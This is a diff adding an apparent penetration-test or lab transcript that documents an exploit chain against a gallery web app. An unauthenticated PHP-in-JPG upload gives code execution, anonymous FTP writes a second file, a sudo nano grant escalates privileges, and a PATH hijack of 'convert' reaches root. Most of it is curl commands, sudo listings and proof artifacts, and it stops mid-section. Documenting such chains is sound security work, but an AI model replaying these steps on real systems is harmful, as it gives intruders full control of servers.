@@ -1,0 +1,90 @@
+### CHAIN TRANSCRIPT — every identity read at its own hop, artifacts read back out of band
+
+== HOP 0: anonymous -> code execution (unauthenticated upload) ==
+$ curl -F "image=@poc.php.jpg;filename=poc.php.jpg" http://172.17.0.5/gallery/uploads/handler.php
+Archivo subido exitosamente: poc_final.php.jpg
+$ curl -s http://172.17.0.5/gallery/uploads/images/poc_final.php.jpg   (anonymous, no cookie)
+PROC|Uid:	33	33	33	33
+PROC|Gid:	33	33	33	33
+PROC|Groups:	33 
+PROC|CapEff:	0000000000000000
+PROC|CapBnd:	00000000a80425fb
+PROC|NoNewPrivs:	0
+PROC|Seccomp:	2
+POSIXUID=33 POSIXEUID=33
+SAPI=apache2handler
+SCRIPT=/var/www/html/gallery/uploads/images/poc_final.php.jpg
+DOCROOT=/var/www/html
+ST_OWNER=33
+ST_MODE=644
+MARK=DL77B-3c9d41a7
+-- out-of-band artifact written by the executing identity, read as root and as www-data --
+-rw-r--r-- 1 www-data www-data 41 Sep 30 14:56 /tmp/DL77MARK-8f3a2c17b4.proof
+DL77MARK-8f3a2c17b4 uid=0 time=1790801774
+== HOP 0b: anonymous FTP -> a second writing identity (uid 101) ==
+$ vsftpd 3.0.5, anonymous login OK, PASV refused (pasv_enable=NO), active mode works
+STOR root: error_perm 553 Could not create file.
+MKD: error_perm 550 Create directory operation failed.
+STOR sub: error_perm 553 Could not create file.
+STOR ftp/: error_perm 553 Could not create file.
+-- on disk: the FTP-authored file is owned by ftp(101), not www-data(33) --
+/var/www/html/gallery/uploads/images/ftp/DL77ftp_ftp.php.jpg ftp:ftp 644
+ftp:x:101:103:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+-- and it executes as www-data --
+FTP-FTP uid=33 euid=33 [200 text/html; charset=UTF-8]
+
+== HOP 1: www-data(33) -> gallery(1001), grant: (gallery) NOPASSWD: /bin/nano ==
+$ sudo -n -l   (as www-data, measured inside the uploaded script)
+== identity ==
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+== sudo ==
+/usr/bin/sudo
+== sudo -n -l ==
+Matching Defaults entries for www-data on bcd2d5855d9a:
+    env_reset, mail_badpass, use_pty
+
+User www-data may run the following commands on bcd2d5855d9a:
+    (gallery) NOPASSWD: /bin/nano
+    (www-data) NOPASSWD: /bin/nano
+== /etc/shadow readable? ==
+-- artifact written by the escalated identity --
+-rw-rw-r-- 1 gallery gallery 455 Sep 30 14:48 /tmp/DL77_esc.txt
+uid=1001(gallery) gid=1001(gallery) groups=1001(gallery)
+total 24
+
+== HOP 2: gallery(1001) -> root(0), PATH hijack of runme's subprogram 'convert' ==
+whoami=gallery PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+--- planted ---
+-rwxr-xr-x 1 gallery gallery 463 Sep 30 14:54 /tmp/dl77p/convert
+--- control: runme with the normal PATH ---
+sh: 1: convert: not found
+Converting image...
+Done.
+rc=0
+--- treatment: runme with /tmp/dl77p prepended ---
+Converting image...
+Done.
+rc=0
+--- artifact? ---
+-rw-r--r-- 1 root root 1285 Sep 30 14:54 /tmp/DL77_root.txt
+-- root-owned artifact --
+-rw-r--r-- 1 root root 1285 Sep 30 14:54 /tmp/DL77_root.txt
+MARK=DL77ROOT-4e91a2
+id output:
+uid=0(root) gid=0(root) groups=0(root)
+
+== NEGATIVE CONTROLS on the sudo grant (from www-data) ==
+== NEGATIVE CONTROLS on the grant, from www-data ==
+  $ sudo: a password is required
+
+  $ sudo: a password is required
+
+  $ sudo: a password is required
+
+  $  GNU nano, version 7.2
+ (C) 2023 the Free Software Foundation and various contributors
+ Compiled options: --disable-libmagic --enable-utf8
+
+  $ Sorry, user www-data is not allowed to execute 'list' as gallery on bcd2d5855d9a.
+
+== now as gallery ==
